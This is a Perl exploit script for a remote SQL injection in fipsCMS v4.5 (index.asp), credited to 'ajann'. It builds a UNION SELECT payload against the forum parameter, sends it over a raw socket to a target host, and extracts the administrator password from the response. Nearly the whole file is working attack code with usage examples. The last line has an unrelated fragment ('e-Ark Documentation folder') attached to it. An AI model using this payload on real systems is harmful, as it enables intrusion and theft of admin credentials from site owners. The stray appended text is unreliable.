#!/usr/bin/perl
#[Script Name: fipsCMS <= v4.5 (index.asp) Remote SQL Injection Exploit
#[Coded by   : ajann
#[Author     : ajann
#[Contact    : :(

use IO::Socket;
if(@ARGV < 3){
print "
[========================================================================
[//  fipsCMS <= v4.5 (index.asp) Remote SQL Injection Exploit
[//           Usage: exploit.pl [target] [path] [userid]
[//                   Example: exploit.pl victim.com / 1
[//                   Example: exploit.pl victim.com /path/ 1
[//                           Vuln&Exp : ajann
[========================================================================
";
exit();
}
#Local variables
$server = $ARGV[0];
$server =~ s/(http:\/\/)//eg;
$host = "http://".$server;
$port = "80";
$dir = $ARGV[1];
$file = "index.asp?lg=1&w=forumshow&fcat=-1&fansweres=True&froot=1&fid=";
$target = "-1%20union%20select%200,0,0,0,0,adminpword,0,0,0,0,0,0%20from%20admin%20where%20adminid%20like%20".$ARGV[2];
$target = $host.$dir.$file.$target;

#Writing data to socket
print "+**********************************************************************+\n";
print "+ Trying to connect: $server\n";
$socket = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$server", PeerPort => "$port") || die "\n+ Connection failed...\n";
print $socket "GET $target HTTP/1.1\n";
print $socket "Host: $server\n";
print $socket "Accept: */*\n";
print $socket "Connection: close\n\n";
print "+ Connected!...\n";
#Getting
while($answer = <$socket>) {
if ($answer =~ /\"150\" value=\"Re:(.*?)class=\"/){ 
print "+ Exploit succeed! Getting admin information.\n";
print "+ ---------------- +\n";
print "+ Password: $1\n";
exit();
}

if ($answer =~ /Internal Server Error/) {
print "+ Exploit Failed : (  \n";
print "+**********************************************************************+\n";
exit(); 
}
 }
   
print "+ Exploit failed :(\n";
print "+**********************************************************************+\n";e-Ark Documentation folder (doc/)


